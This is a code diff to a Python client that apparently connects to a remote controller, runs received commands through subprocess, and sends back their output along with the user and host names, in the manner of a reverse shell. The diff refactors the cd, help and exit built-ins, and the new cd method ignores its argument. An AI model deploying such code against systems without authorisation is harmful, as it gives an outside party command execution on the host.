@@ -80,6 +80,20 @@ class Connection(object):
         self.sock.close()
 
 
+class Builtin:
+    def help():
+        # Handled remotely
+        pass
+
+    def cd(s: str):
+        os.chdir(rmt[1])
+
+    def exit(c: Connection):
+        c.close()
+        exit(0)
+
+
+
 if __name__ == '__main__':
     u = gp.getuser()
     h = socket.gethostname()
@@ -109,10 +123,10 @@ if __name__ == '__main__':
                 if not (rmt := c.recv().decode().split()):
                     continue
 
-                # Process internal commands
+                # Handle builtins
                 if rmt[0] == 'cd':
                     try:
-                        os.chdir(rmt[1])
+                        Builtin.cd(rmt[1])
                         lcl = prompt()
 
                     except Exception as x:
@@ -121,32 +135,34 @@ if __name__ == '__main__':
                         if Config.DEBUG:
                             print(lcl)
 
-                    continue
+                elif rmt[0] == 'help':
+                    Builtin.help()
 
                 elif rmt[0] == 'exit':
-                    break                    
+                    Builtin.exit(c)
 
                 # Execute subprocess and wait for it to finish
-                try:
-                    proc = sp.Popen(
-                        rmt,
-                        stdin = sp.PIPE, stdout = sp.PIPE, stderr = sp.PIPE
-                    )
+                else:
+                    try:
+                        proc = sp.Popen(
+                            rmt,
+                            stdin = sp.PIPE, stdout = sp.PIPE, stderr = sp.PIPE
+                        )
 
-                    # Retrieve command output
-                    out, err = proc.communicate()
+                        # Retrieve command output
+                        out, err = proc.communicate()
 
-                    lcl = f'{out.decode()}{err.decode()}' if (out or err) else ''
+                        lcl = f'{out.decode()}{err.decode()}' if (out or err) else ''
 
-                    # Append prompt to message
-                    r = proc.wait()
-                    lcl += f'{r}:{prompt()}' if r else prompt()
+                        # Append prompt to message
+                        r = proc.wait()
+                        lcl += f'{r}:{prompt()}' if r else prompt()
 
-                except FileNotFoundError:
-                    lcl = f'[alter] Command not found\n{prompt()}'
+                    except FileNotFoundError:
+                        lcl = f'[alter] Command not found\n{prompt()}'
 
-                    if Config.DEBUG:
-                        print(lcl)
+                        if Config.DEBUG:
+                            print(lcl)
 
             except Exception as x:
                 lcl = f'[!] {type(x).__name__}: {x}\n{prompt()}'
